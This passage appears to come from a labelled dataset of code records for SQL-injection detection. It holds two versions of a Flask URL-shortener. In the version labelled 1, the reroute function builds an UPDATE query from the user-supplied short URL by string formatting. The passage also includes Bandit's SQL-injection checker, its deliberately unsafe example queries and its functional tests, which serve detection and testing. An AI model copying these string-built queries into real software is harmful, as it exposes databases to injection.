# Setting UTF-8 encoding

reload(sys)
sys.setdefaultencoding('UTF-8')
os.putenv('LANG', 'en_US.UTF-8')
os.putenv('LC_ALL', 'en_US.UTF-8')

app = Flask(__name__)
app.config.from_object('config')

shorty_host = config.domain

# MySQL configurations

host = config.host
user = config.user
passwrd = config.passwrd
db = config.db

@app.route('/analytics/<short_url>')
def analytics(short_url):

	info_fetch , counter_fetch , browser_fetch , platform_fetch = list_data(short_url)
	return render_template(""data.html"" , host = shorty_host,info = info_fetch ,counter = counter_fetch ,\
	 browser = browser_fetch , platform = platform_fetch)


@app.route('/' , methods=['GET' , 'POST'])
def index():

	conn = MySQLdb.connect(host , user , passwrd, db)
	cursor = conn.cursor()
	
	# Return the full table to displat on index.
	list_sql = ""SELECT * FROM WEB_URL;""
	cursor.execute(list_sql)
	result_all_fetch = cursor.fetchall()

		
	if request.method == 'POST':
		og_url = request.form.get('url_input')
		custom_suff = request.form.get('url_custom')
		tag_url = request.form.get('url_tag')
		if custom_suff == '':
			token_string =  random_token()
		else:
			token_string = custom_suff
		if og_url != '':
			if url_check(og_url) == True:
				
				# Check's for existing suffix 
				check_row = ""SELECT S_URL FROM WEB_URL WHERE S_URL = %s FOR UPDATE""
				cursor.execute(check_row,(token_string,))
				check_fetch = cursor.fetchone()

				if (check_fetch is None):
					insert_row = """"""
						INSERT INTO WEB_URL(URL , S_URL , TAG) VALUES( %s, %s , %s)
						""""""
					result_cur = cursor.execute(insert_row ,(og_url , token_string , tag_url,))
					conn.commit()
					conn.close()
					e = ''
					return render_template('index.html' ,shorty_url = shorty_host+token_string , error = e )
				else:
					e = ""The Custom suffix already exists . Please use another suffix or leave it blank for random suffix.""
					return render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)
			else:
				e = ""URL entered doesn't seem valid , Enter a valid URL.""
				return render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)

		else:
			e = ""Enter a URL.""
			return render_template('index.html' , table = result_all_fetch, host = shorty_host,error = e)
	else:	
		e = ''
		return render_template('index.html',table = result_all_fetch ,host = shorty_host, error = e )
	
# Rerouting funciton	

@app.route('/<short_url>')
def reroute(short_url):

	conn = MySQLdb.connect(host , user , passwrd, db)
	cursor = conn.cursor()
	platform = request.user_agent.platform
	browser =  request.user_agent.browser
	counter = 1

	# Platform , Browser vars
	
	browser_dict = {'firefox': 0 , 'chrome':0 , 'safari':0 , 'other':0}
	platform_dict = {'windows':0 , 'iphone':0 , 'android':0 , 'linux':0 , 'macos':0 , 'other':0}

	# Analytics
	if browser in browser_dict:
		browser_dict[browser] += 1
	else:								
		browser_dict['other'] += 1
	
	if platform in platform_dict.iterkeys():
		platform_dict[platform] += 1
	else:
		platform_dict['other'] += 1
			
	cursor.execute(""SELECT URL FROM WEB_URL WHERE S_URL = %s;"" ,(short_url,) )

	try:
		new_url = cursor.fetchone()[0]
		print new_url
		# Update Counters 
		
		counter_sql = ""\
				UPDATE {tn} SET COUNTER = COUNTER + {og_counter} , CHROME = CHROME + {og_chrome} , FIREFOX = FIREFOX+{og_firefox} ,\
				SAFARI = SAFARI+{og_safari} , OTHER_BROWSER =OTHER_BROWSER+ {og_oth_brow} , ANDROID = ANDROID +{og_andr} , IOS = IOS +{og_ios},\
				WINDOWS = WINDOWS+{og_windows} , LINUX = LINUX+{og_linux}  , MAC =MAC+ {og_mac} , OTHER_PLATFORM =OTHER_PLATFORM+ {og_plat_other} WHERE S_URL = %s;"".\
				format(tn = ""WEB_URL"" , og_counter = counter , og_chrome = browser_dict['chrome'] , og_firefox = browser_dict['firefox'],\
				og_safari = browser_dict['safari'] , og_oth_brow = browser_dict['other'] , og_andr = platform_dict['android'] , og_ios = platform_dict['iphone'] ,\
				og_windows = platform_dict['windows'] , og_linux = platform_dict['linux'] , og_mac = platform_dict['macos'] , og_plat_other = platform_dict['other'])
		res_update = cursor.execute(counter_sql, (short_url, ))
		conn.commit()
		conn.close()

		return redirect(new_url)

	except Exception as e:
		e = ""Something went wrong.Please try again.""
		return render_template('404.html') ,404

# Search results
@app.route('/search' ,  methods=['GET' , 'POST'])
def search():
	s_tag = request.form.get('search_url')
	if s_tag == """":
		return render_template('index.html', error = ""Please enter a search term"")
	else:
		conn = MySQLdb.connect(host , user , passwrd, db)
		cursor = conn.cursor()
		
		search_tag_sql = ""SELECT * FROM WEB_URL WHERE TAG = %s"" 
		cursor.execute(search_tag_sql , (s_tag, ) )
		search_tag_fetch = cursor.fetchall()
		conn.close()
		return render_template('search.html' , host = shorty_host , search_tag = s_tag , table = search_tag_fetch )


@app.after_request
def after_request(response):
	timestamp = strftime('[%Y-%b-%d %H:%M]')
	logger.error('%s %s %s %s %s %s',timestamp , request.remote_addr , \
				request.method , request.scheme , request.full_path , response.status)
	return response


@app.errorhandler(Exception)
def exceptions(e):
	tb = traceback.format_exc()
	timestamp = strftime('[%Y-%b-%d %H:%M]')
	logger.error('%s %s %s %s %s 5xx INTERNAL SERVER ERROR\n%s',
        timestamp, request.remote_addr, request.method,
        request.scheme, request.full_path, tb)
	return make_response(e , 405)

if __name__ == '__main__':

	# Logging handler
	handler = RotatingFileHandler('shorty.log' , maxBytes=100000 , backupCount = 3)
	logger = logging.getLogger('tdm')
	logger.setLevel(logging.ERROR)
	logger.addHandler(handler)
	app.run(host='127.0.0.1' , port=5000)

/n/n/n",0,sql
11,83,071497f90bcf7336c44e135d5ef4bd87898fa8d0,"/app.py/n/n#!/usr/bin/env python2.7

import sys
import os

# Flask Import
from flask import Flask , request , redirect , render_template , url_for 
from flask import jsonify , abort , make_response 
import MySQLdb

# Toekn and URL check import
from check_encode import random_token , url_check
from display_list import list_data

from sql_table import mysql_table

# Config import
import config

# Import Loggers
import logging
from logging.handlers import RotatingFileHandler
from time import strftime
import traceback

# Setting UTF-8 encoding

reload(sys)
sys.setdefaultencoding('UTF-8')
os.putenv('LANG', 'en_US.UTF-8')
os.putenv('LC_ALL', 'en_US.UTF-8')

app = Flask(__name__)
app.config.from_object('config')

shorty_host = config.domain

# MySQL configurations

host = config.host
user = config.user
passwrd = config.passwrd
db = config.db

@app.route('/analytics/<short_url>')
def analytics(short_url):

	info_fetch , counter_fetch , browser_fetch , platform_fetch = list_data(short_url)
	return render_template(""data.html"" , host = shorty_host,info = info_fetch ,counter = counter_fetch ,\
	 browser = browser_fetch , platform = platform_fetch)


@app.route('/' , methods=['GET' , 'POST'])
def index():

	conn = MySQLdb.connect(host , user , passwrd, db)
	cursor = conn.cursor()
	
	# Return the full table to displat on index.
	list_sql = ""SELECT * FROM WEB_URL;""
	cursor.execute(list_sql)
	result_all_fetch = cursor.fetchall()

		
	if request.method == 'POST':
		og_url = request.form.get('url_input')
		custom_suff = request.form.get('url_custom')
		tag_url = request.form.get('url_tag')
		if custom_suff == '':
			token_string =  random_token()
		else:
			token_string = custom_suff
		if og_url != '':
			if url_check(og_url) == True:
				
				# Check's for existing suffix 
				check_row = ""SELECT S_URL FROM WEB_URL WHERE S_URL = %s FOR UPDATE""
				cursor.execute(check_row,(token_string,))
				check_fetch = cursor.fetchone()

				if (check_fetch is None):
					insert_row = """"""
						INSERT INTO WEB_URL(URL , S_URL , TAG) VALUES( %s, %s , %s)
						""""""
					result_cur = cursor.execute(insert_row ,(og_url , token_string , tag_url,))
					conn.commit()
					conn.close()
					e = ''
					return render_template('index.html' ,shorty_url = shorty_host+token_string , error = e )
				else:
					e = ""The Custom suffix already exists . Please use another suffix or leave it blank for random suffix.""
					return render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)
			else:
				e = ""URL entered doesn't seem valid , Enter a valid URL.""
				return render_template('index.html' ,table = result_all_fetch, host = shorty_host,error = e)

		else:
			e = ""Enter a URL.""
			return render_template('index.html' , table = result_all_fetch, host = shorty_host,error = e)
	else:	
		e = ''
		return render_template('index.html',table = result_all_fetch ,host = shorty_host, error = e )
	
# Rerouting funciton	

@app.route('/<short_url>')
def reroute(short_url):

	conn = MySQLdb.connect(host , user , passwrd, db)
	cursor = conn.cursor()
	platform = request.user_agent.platform
	browser =  request.user_agent.browser
	counter = 1

	# Platform , Browser vars
	
	browser_dict = {'firefox': 0 , 'chrome':0 , 'safari':0 , 'other':0}
	platform_dict = {'windows':0 , 'iphone':0 , 'android':0 , 'linux':0 , 'macos':0 , 'other':0}

	# Analytics
	if browser in browser_dict:
		browser_dict[browser] += 1
	else:								
		browser_dict['other'] += 1
	
	if platform in platform_dict.iterkeys():
		platform_dict[platform] += 1
	else:
		platform_dict['other'] += 1
			
	cursor.execute(""SELECT URL FROM WEB_URL WHERE S_URL = %s;"" ,(short_url,) )

	try:
		new_url = cursor.fetchone()[0]
		print new_url
		# Update Counters 
		
		counter_sql = ""\
				UPDATE {tn} SET COUNTER = COUNTER + {og_counter} , CHROME = CHROME + {og_chrome} , FIREFOX = FIREFOX+{og_firefox} ,\
				SAFARI = SAFARI+{og_safari} , OTHER_BROWSER =OTHER_BROWSER+ {og_oth_brow} , ANDROID = ANDROID +{og_andr} , IOS = IOS +{og_ios},\
				WINDOWS = WINDOWS+{og_windows} , LINUX = LINUX+{og_linux}  , MAC =MAC+ {og_mac} , OTHER_PLATFORM =OTHER_PLATFORM+ {og_plat_other} WHERE S_URL = '{surl}';"".\
				format(tn = ""WEB_URL"" , og_counter = counter , og_chrome = browser_dict['chrome'] , og_firefox = browser_dict['firefox'],\
				og_safari = browser_dict['safari'] , og_oth_brow = browser_dict['other'] , og_andr = platform_dict['android'] , og_ios = platform_dict['iphone'] ,\
				og_windows = platform_dict['windows'] , og_linux = platform_dict['linux'] , og_mac = platform_dict['macos'] , og_plat_other = platform_dict['other'] ,\
				surl = short_url)
		res_update = cursor.execute(counter_sql)
		conn.commit()
		conn.close()

		return redirect(new_url)

	except Exception as e:
		e = ""Something went wrong.Please try again.""
		return render_template('404.html') ,404

# Search results
@app.route('/search' ,  methods=['GET' , 'POST'])
def search():
	s_tag = request.form.get('search_url')
	if s_tag == """":
		return render_template('index.html', error = ""Please enter a search term"")
	else:
		conn = MySQLdb.connect(host , user , passwrd, db)
		cursor = conn.cursor()
		
		search_tag_sql = ""SELECT * FROM WEB_URL WHERE TAG = %s"" 
		cursor.execute(search_tag_sql , (s_tag, ) )
		search_tag_fetch = cursor.fetchall()
		conn.close()
		return render_template('search.html' , host = shorty_host , search_tag = s_tag , table = search_tag_fetch )


@app.after_request
def after_request(response):
	timestamp = strftime('[%Y-%b-%d %H:%M]')
	logger.error('%s %s %s %s %s %s',timestamp , request.remote_addr , \
				request.method , request.scheme , request.full_path , response.status)
	return response


@app.errorhandler(Exception)
def exceptions(e):
	tb = traceback.format_exc()
	timestamp = strftime('[%Y-%b-%d %H:%M]')
	logger.error('%s %s %s %s %s 5xx INTERNAL SERVER ERROR\n%s',
        timestamp, request.remote_addr, request.method,
        request.scheme, request.full_path, tb)
	return make_response(e , 405)

if __name__ == '__main__':

	# Logging handler
	handler = RotatingFileHandler('shorty.log' , maxBytes=100000 , backupCount = 3)
	logger = logging.getLogger('tdm')
	logger.setLevel(logging.ERROR)
	logger.addHandler(handler)
	app.run(host='127.0.0.1' , port=5000)

/n/n/n",1,sql
12,26,6ce60806ca8a44d8a8b37050539e2b2f9a54b847,"bandit/plugins/injection_sql.py/n/n# -*- coding:utf-8 -*-
#
# Copyright 2014 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the ""License""); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

r""""""
============================
B608: Test for SQL injection
============================

An SQL injection attack consists of insertion or ""injection"" of a SQL query via
the input data given to an application. It is a very common attack vector. This
plugin test looks for strings that resemble SQL statements that are involved in
some form of string building operation. For example:

 - ""SELECT %s FROM derp;"" % var
 - ""SELECT thing FROM "" + tab
 - ""SELECT "" + val + "" FROM "" + tab + ...
 - ""SELECT {} FROM derp;"".format(var)

Unless care is taken to sanitize and control the input data when building such
SQL statement strings, an injection attack becomes possible. If strings of this
nature are discovered, a LOW confidence issue is reported. In order to boost
result confidence, this plugin test will also check to see if the discovered
string is in use with standard Python DBAPI calls `execute` or `executemany`.
If so, a MEDIUM issue is reported. For example:

 - cursor.execute(""SELECT %s FROM derp;"" % var)


:Example:

.. code-block:: none

    >> Issue: Possible SQL injection vector through string-based query
    construction.
       Severity: Medium   Confidence: Low
       Location: ./examples/sql_statements_without_sql_alchemy.py:4
    3 query = ""DELETE FROM foo WHERE id = '%s'"" % identifier
    4 query = ""UPDATE foo SET value = 'b' WHERE id = '%s'"" % identifier
    5

.. seealso::

 - https://www.owasp.org/index.php/SQL_Injection
 - https://security.openstack.org/guidelines/dg_parameterize-database-queries.html  # noqa

.. versionadded:: 0.9.0

""""""

import ast
import re

import bandit
from bandit.core import test_properties as test
from bandit.core import utils

SIMPLE_SQL_RE = re.compile(
    r'(select\s.*from\s|'
    r'delete\s+from\s|'
    r'insert\s+into\s.*values\s|'
    r'update\s.*set\s)',
    re.IGNORECASE | re.DOTALL,
)


def _check_string(data):
    return SIMPLE_SQL_RE.search(data) is not None


def _evaluate_ast(node):
    wrapper = None
    statement = ''

    if isinstance(node.parent, ast.BinOp):
        out = utils.concat_string(node, node.parent)
        wrapper = out[0].parent
        statement = out[1]
    elif (isinstance(node.parent, ast.Attribute)
          and node.parent.attr == 'format'):
        statement = node.s
        # Hierarchy for """".format() is Wrapper -> Call -> Attribute -> Str
        wrapper = node.parent.parent.parent

    if isinstance(wrapper, ast.Call):  # wrapped in ""execute"" call?
        names = ['execute', 'executemany']
        name = utils.get_called_name(wrapper)
        return (name in names, statement)
    else:
        return (False, statement)


@test.checks('Str')
@test.test_id('B608')
def hardcoded_sql_expressions(context):
    val = _evaluate_ast(context.node)
    if _check_string(val[1]):
        return bandit.Issue(
            severity=bandit.MEDIUM,
            confidence=bandit.MEDIUM if val[0] else bandit.LOW,
            text=""Possible SQL injection vector through string-based ""
                 ""query construction.""
        )
/n/n/nexamples/sql_statements.py/n/nimport sqlalchemy

# bad
query = ""SELECT * FROM foo WHERE id = '%s'"" % identifier
query = ""INSERT INTO foo VALUES ('a', 'b', '%s')"" % value
query = ""DELETE FROM foo WHERE id = '%s'"" % identifier
query = ""UPDATE foo SET value = 'b' WHERE id = '%s'"" % identifier
query = """"""WITH cte AS (SELECT x FROM foo)
SELECT x FROM cte WHERE x = '%s'"""""" % identifier
# bad alternate forms
query = ""SELECT * FROM foo WHERE id = '"" + identifier + ""'""
query = ""SELECT * FROM foo WHERE id = '{}'"".format(identifier)

# bad
cur.execute(""SELECT * FROM foo WHERE id = '%s'"" % identifier)
cur.execute(""INSERT INTO foo VALUES ('a', 'b', '%s')"" % value)
cur.execute(""DELETE FROM foo WHERE id = '%s'"" % identifier)
cur.execute(""UPDATE foo SET value = 'b' WHERE id = '%s'"" % identifier)
# bad alternate forms
cur.execute(""SELECT * FROM foo WHERE id = '"" + identifier + ""'"")
cur.execute(""SELECT * FROM foo WHERE id = '{}'"".format(identifier))

# good
cur.execute(""SELECT * FROM foo WHERE id = '%s'"", identifier)
cur.execute(""INSERT INTO foo VALUES ('a', 'b', '%s')"", value)
cur.execute(""DELETE FROM foo WHERE id = '%s'"", identifier)
cur.execute(""UPDATE foo SET value = 'b' WHERE id = '%s'"", identifier)

# bug: https://bugs.launchpad.net/bandit/+bug/1479625
def a():
    def b():
        pass
    return b

a()(""SELECT %s FROM foo"" % val)

# real world false positives
choices=[('server_list', _(""Select from active instances""))]
print(""delete from the cache as the first argument"")
/n/n/ntests/functional/test_functional.py/n/n# -*- coding:utf-8 -*-
#
# Copyright 2014 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the ""License""); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

import os

import six
import testtools

from bandit.core import config as b_config
from bandit.core import constants as C
from bandit.core import manager as b_manager
from bandit.core import metrics
from bandit.core import test_set as b_test_set


class FunctionalTests(testtools.TestCase):

    '''Functional tests for bandit test plugins.

    This set of tests runs bandit against each example file in turn
    and records the score returned. This is compared to a known good value.
    When new tests are added to an example the expected result should be
    adjusted to match.
    '''

    def setUp(self):
        super(FunctionalTests, self).setUp()
        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch
        # them up here for the testing environment.
        #
        path = os.path.join(os.getcwd(), 'bandit', 'plugins')
        b_conf = b_config.BanditConfig()
        self.b_mgr = b_manager.BanditManager(b_conf, 'file')
        self.b_mgr.b_conf._settings['plugins_dir'] = path
        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)

    def run_example(self, example_script, ignore_nosec=False):
        '''A helper method to run the specified test

        This method runs the test, which populates the self.b_mgr.scores
        value. Call this directly if you need to run a test, but do not
        need to test the resulting scores against specified values.
        :param example_script: Filename of an example script to test
        '''
        path = os.path.join(os.getcwd(), 'examples', example_script)
        self.b_mgr.ignore_nosec = ignore_nosec
        self.b_mgr.discover_files([path], True)
        self.b_mgr.run_tests()

    def check_example(self, example_script, expect, ignore_nosec=False):
        '''A helper method to test the scores for example scripts.

        :param example_script: Filename of an example script to test
        :param expect: dict with expected counts of issue types
        '''
        # reset scores for subsequent calls to check_example
        self.b_mgr.scores = []
        self.run_example(example_script, ignore_nosec=ignore_nosec)
        expected = 0
        result = 0
        for test_scores in self.b_mgr.scores:
            for score_type in test_scores:
                self.assertIn(score_type, expect)
                for rating in expect[score_type]:
                    expected += (
                        expect[score_type][rating] * C.RANKING_VALUES[rating]
                    )
                result += sum(test_scores[score_type])
        self.assertEqual(expected, result)

    def check_metrics(self, example_script, expect):
        '''A helper method to test the metrics being returned.

        :param example_script: Filename of an example script to test
        :param expect: dict with expected values of metrics
        '''
        self.b_mgr.metrics = metrics.Metrics()
        self.b_mgr.scores = []
        self.run_example(example_script)

        # test general metrics (excludes issue counts)
        m = self.b_mgr.metrics.data
        for k in expect:
            if k != 'issues':
                self.assertEqual(expect[k], m['_totals'][k])
        # test issue counts
        if 'issues' in expect:
            for (criteria, default) in C.CRITERIA:
                for rank in C.RANKING:
                    label = '{0}.{1}'.format(criteria, rank)
                    expected = 0
                    if expect['issues'].get(criteria, None).get(rank, None):
                        expected = expect['issues'][criteria][rank]
                    self.assertEqual(expected, m['_totals'][label])

    def test_binding(self):
        '''Test the bind-to-0.0.0.0 example.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}
        self.check_example('binding.py', expect)

    def test_crypto_md5(self):
        '''Test the `hashlib.md5` example.'''
        expect = {'SEVERITY': {'MEDIUM': 11},
                  'CONFIDENCE': {'HIGH': 11}}
        self.check_example('crypto-md5.py', expect)

    def test_ciphers(self):
        '''Test the `Crypto.Cipher` example.'''
        expect = {'SEVERITY': {'HIGH': 13},
                  'CONFIDENCE': {'HIGH': 13}}
        self.check_example('ciphers.py', expect)

    def test_cipher_modes(self):
        '''Test for insecure cipher modes.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('cipher-modes.py', expect)

    def test_eval(self):
        '''Test the `eval` example.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('eval.py', expect)

    def test_mark_safe(self):
        '''Test the `mark_safe` example.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('mark_safe.py', expect)

    def test_exec(self):
        '''Test the `exec` example.'''
        filename = 'exec-{}.py'
        if six.PY2:
            filename = filename.format('py2')
            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}
        else:
            filename = filename.format('py3')
            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example(filename, expect)

    def test_exec_as_root(self):
        '''Test for the `run_as_root=True` keyword argument.'''
        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}
        self.check_example('exec-as-root.py', expect)

    def test_hardcoded_passwords(self):
        '''Test for hard-coded passwords.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}
        self.check_example('hardcoded-passwords.py', expect)

    def test_hardcoded_tmp(self):
        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}
        self.check_example('hardcoded-tmp.py', expect)

    def test_httplib_https(self):
        '''Test for `httplib.HTTPSConnection`.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('httplib_https.py', expect)

    def test_imports_aliases(self):
        '''Test the `import X as Y` syntax.'''
        expect = {
            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},
            'CONFIDENCE': {'HIGH': 9}
        }
        self.check_example('imports-aliases.py', expect)

    def test_imports_from(self):
        '''Test the `from X import Y` syntax.'''
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('imports-from.py', expect)

    def test_imports_function(self):
        '''Test the `__import__` function.'''
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('imports-function.py', expect)

    def test_telnet_usage(self):
        '''Test for `import telnetlib` and Telnet.* calls.'''
        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('telnetlib.py', expect)

    def test_ftp_usage(self):
        '''Test for `import ftplib` and FTP.* calls.'''
        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('ftplib.py', expect)

    def test_imports(self):
        '''Test for dangerous imports.'''
        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}
        self.check_example('imports.py', expect)

    def test_mktemp(self):
        '''Test for `tempfile.mktemp`.'''
        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}
        self.check_example('mktemp.py', expect)

    def test_nonsense(self):
        '''Test that a syntactically invalid module is skipped.'''
        self.run_example('nonsense.py')
        self.assertEqual(1, len(self.b_mgr.skipped))

    def test_okay(self):
        '''Test a vulnerability-free file.'''
        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}
        self.check_example('okay.py', expect)

    def test_os_chmod(self):
        '''Test setting file permissions.'''
        filename = 'os-chmod-{}.py'
        if six.PY2:
            filename = filename.format('py2')
        else:
            filename = filename.format('py3')
        expect = {
            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},
            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}
        }
        self.check_example(filename, expect)

    def test_os_exec(self):
        '''Test for `os.exec*`.'''
        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}
        self.check_example('os-exec.py', expect)

    def test_os_popen(self):
        '''Test for `os.popen`.'''
        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 9}}
        self.check_example('os-popen.py', expect)

    def test_os_spawn(self):
        '''Test for `os.spawn*`.'''
        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}
        self.check_example('os-spawn.py', expect)

    def test_os_startfile(self):
        '''Test for `os.startfile`.'''
        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}
        self.check_example('os-startfile.py', expect)

    def test_os_system(self):
        '''Test for `os.system`.'''
        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('os_system.py', expect)

    def test_pickle(self):
        '''Test for the `pickle` module.'''
        expect = {
            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},
            'CONFIDENCE': {'HIGH': 8}
        }
        self.check_example('pickle_deserialize.py', expect)

    def test_popen_wrappers(self):
        '''Test the `popen2` and `commands` modules.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('popen_wrappers.py', expect)

    def test_random_module(self):
        '''Test for the `random` module.'''
        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}
        self.check_example('random_module.py', expect)

    def test_requests_ssl_verify_disabled(self):
        '''Test for the `requests` library skipping verification.'''
        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('requests-ssl-verify-disabled.py', expect)

    def test_skip(self):
        '''Test `#nosec` and `#noqa` comments.'''
        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}
        self.check_example('skip.py', expect)

    def test_ignore_skip(self):
        '''Test --ignore-nosec flag.'''
        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}
        self.check_example('skip.py', expect, ignore_nosec=True)

    def test_sql_statements(self):
        '''Test for SQL injection through string building.'''
        expect = {
            'SEVERITY': {'MEDIUM': 14},
            'CONFIDENCE': {'LOW': 8, 'MEDIUM': 6}}
        self.check_example('sql_statements.py', expect)

    def test_ssl_insecure_version(self):
        '''Test for insecure SSL protocol versions.'''
        expect = {
            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},
            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}
        }
        self.check_example('ssl-insecure-version.py', expect)

    def test_subprocess_shell(self):
        '''Test for `subprocess.Popen` with `shell=True`.'''
        expect = {
            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},
            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}
        }
        self.check_example('subprocess_shell.py', expect)

    def test_urlopen(self):
        '''Test for dangerous URL opening.'''
        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}
        self.check_example('urlopen.py', expect)

    def test_utils_shell(self):
        '''Test for `utils.execute*` with `shell=True`.'''
        expect = {
            'SEVERITY': {'LOW': 5},
            'CONFIDENCE': {'HIGH': 5}
        }
        self.check_example('utils-shell.py', expect)

    def test_wildcard_injection(self):
        '''Test for wildcard injection in shell commands.'''
        expect = {
            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},
            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}
        }
        self.check_example('wildcard-injection.py', expect)

    def test_yaml(self):
        '''Test for `yaml.load`.'''
        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}
        self.check_example('yaml_load.py', expect)

    def test_jinja2_templating(self):
        '''Test jinja templating for potential XSS bugs.'''
        expect = {
            'SEVERITY': {'HIGH': 4},
            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}
        }
        self.check_example('jinja2_templating.py', expect)

    def test_secret_config_option(self):
        '''Test for `secret=True` in Oslo's config.'''
        expect = {
            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},
            'CONFIDENCE': {'MEDIUM': 3}
        }
        self.check_example('secret-config-option.py', expect)

    def test_mako_templating(self):
        '''Test Mako templates for XSS.'''
        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}
        self.check_example('mako_templating.py', expect)

    def test_xml(self):
        '''Test xml vulnerabilities.'''
        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}
        self.check_example('xml_etree_celementtree.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}
        self.check_example('xml_expatbuilder.py', expect)

        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}
        self.check_example('xml_lxml.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}
        self.check_example('xml_pulldom.py', expect)

        expect = {'SEVERITY': {'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('xml_xmlrpc.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}
        self.check_example('xml_etree_elementtree.py', expect)

        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}
        self.check_example('xml_expatreader.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}
        self.check_example('xml_minidom.py', expect)

        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},
                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}
        self.check_example('xml_sax.py', expect)

    def test_httpoxy(self):
        '''Test httpoxy vulnerability.'''
        expect = {'SEVERITY': {'HIGH': 1},
                  'CONFIDENCE': {'HIGH': 1}}
        self.check_example('httpoxy_cgihandler.py', expect)
        self.check_example('httpoxy_twisted_script.py', expect)
